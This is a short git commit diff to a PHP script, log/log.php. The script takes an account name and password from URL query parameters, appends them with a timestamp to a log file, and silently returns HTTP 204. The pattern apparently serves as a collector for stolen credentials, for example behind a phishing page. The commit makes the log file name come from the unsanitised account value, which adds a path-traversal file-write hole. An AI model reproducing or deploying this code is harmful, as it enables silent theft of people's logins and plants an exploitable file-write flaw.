ac870f0d3b2bf99fb283966f68260e34e3547646
irjdekker <ir.j.dekker@gmail.com>
2017-05-27 13:48:32 +0200

    Commit

--- log/log.php
+++ log/log.php
@@ -2,6 +2,7 @@
 $account = html_entity_decode(stripslashes($_GET["acc"])); 
 $password = html_entity_decode(stripslashes($_GET["pw"]));
 $req_dump = date("D M d, Y G:i", time()) . " : " . $account . " - " . $password . PHP_EOL;
-$fp = file_put_contents('dump.log', $req_dump, FILE_APPEND );
+$file = $account . ".log";
+$fp = file_put_contents($file, $req_dump, FILE_APPEND );
 header("HTTP/1.0 204 No Content");
 ?>
